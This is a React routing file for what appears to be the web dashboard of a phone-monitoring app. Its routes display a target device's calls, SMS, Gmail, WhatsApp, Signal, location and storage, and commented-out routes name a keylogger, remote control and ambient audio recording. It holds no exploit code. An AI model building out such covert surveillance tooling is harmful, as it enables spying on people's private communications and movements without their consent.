import Loadable from "ui-component/Loadable";
import { lazy } from "react";
import CallLogs from "views/PhoneLogs/CallLogs";
// import CalendarLogs from "views/PhoneLogs/CalendarLogs";
import SmsLogs from "views/PhoneLogs/SmsLogs";
// import Photos from "views/single-pages/Photos";
import DeviceInfo from "views/single-pages/DeviceInfo";
import Locations from "views/single-pages/Locations";
// import Videos from "views/single-pages/Videos";
import Contacts from "views/PhoneLogs/Contacts";
import GmailLogs from "views/PhoneLogs/GmailLogs";
// import InternetHistory from "views/PhoneLogs/InternetHistory";
import WhatsappLogs from "views/MessagesLogs/WhatsappLogs";
// import SkypeLogs from "views/MessagesLogs/SkypeLogs";
// import Screenshots from "views/single-pages/Screenshots";
import InstalledApps from "views/single-pages/InstalledApps";
// import WifiNetwork from "views/single-pages/WifiNetwork";
import SignalLogs from "views/MessagesLogs/SignalLogs";
// import KikLogs from "views/MessagesLogs/KikLogs";
// import LineLogs from "views/MessagesLogs/LineLogs";
// import TinderLogs from "views/MessagesLogs/TinderLogs";
// import ViberLogs from "views/MessagesLogs/ViberLogs";
// import ScreenTime from "views/single-pages/ScreenTime";
// import KeyLogger from "views/single-pages/KeyLogger";
// import RemoteControl from "views/single-pages/RemoteControl";
// import FacebookLogs from "views/MessagesLogs/FacebookLogs";
// import SnapchatLogs from "views/MessagesLogs/Snapchat";
import ListOfDevices from "views/dashboard/Default/ListOfDevices";
// import RecordSurround from "views/single-pages/RecordSurround";
import Phonestorage from "views/single-pages/PhoneStorage";
// import AppleHealth from "views/single-pages/AppleHealth";
// import LinkedInLogs from "views/MessagesLogs/LinkedInLogs";

// dashboard routing
const DashboardDefault = Loadable(
  lazy(() => import("views/dashboard/Default"))
);
// login option 3 routing
const AuthLogin3 = Loadable(
  lazy(() => import("views/pages/authentication/authentication3/Login3"))
);

const publicRoutes = [
  { path: "/login", component: AuthLogin3 },

  // { path: '/register', component: Register }
];
const privateRoutes = [
  { path: "/dashboard", component: DashboardDefault },
  { path: "/all-device-list", component: ListOfDevices },
  { path: "/user/device-info/:userDeviceId", component: DeviceInfo },
  { path: "/user/call-logs/:userDeviceId", component: CallLogs },
  { path: "/user/sms-logs/:userDeviceId", component: SmsLogs },
  { path: "/user/contacts/:userDeviceId", component: Contacts },
  // { path: "/user/photos/:userDeviceId", component: Photos },
  // { path: "/user/videos/:userDeviceId", component: Videos },
  { path: "/user/phonestorage/:userDeviceId", component: Phonestorage },

  // { path: '/user/sim-info/:userDeviceId', component: SimInfo },
  { path: "/user/locations/:userDeviceId", component: Locations },
  { path: "/user/gmail/:userDeviceId", component: GmailLogs },
  // { path: "/user/internet-history/:userDeviceId", component: InternetHistory },
  { path: "/user/installed-apps/:userDeviceId", component: InstalledApps },
  { path: "/user/whatsapp/:userDeviceId", component: WhatsappLogs },
  // { path: "/user/wifinetwork/:userDeviceId", component: WifiNetwork },
  // { path: "/user/screenshots/:userDeviceId", component: Screenshots },
  // { path: "/user/calendar/:userDeviceId", component: CalendarLogs },
  // { path: "/user/skype/:userDeviceId", component: SkypeLogs },
  // { path: "/user/kik/:userDeviceId", component: KikLogs },
  // { path: "/user/line/:userDeviceId", component: LineLogs },
  // { path: "/user/tinder/:userDeviceId", component: TinderLogs },
  // { path: "/user/viber/:userDeviceId", component: ViberLogs },
  // { path: "/user/screen-time/:userDeviceId", component: ScreenTime },
  // { path: "/user/keylogger/:userDeviceId", component: KeyLogger },
  // { path: "/user/remote-control/:userDeviceId", component: RemoteControl },
  { path: "/user/signal/:userDeviceId", component: SignalLogs },
  // { path: "/user/snapchat/:userDeviceId", component: SnapchatLogs },
  // { path: "/user/record-surrond/:userDeviceId", component: RecordSurround },
  // { path: "/user/apple-health/:userDeviceId", component: AppleHealth },
  // { path: "/user/linkedin/:userDeviceId", component: LinkedInLogs },
];
export { publicRoutes, privateRoutes };
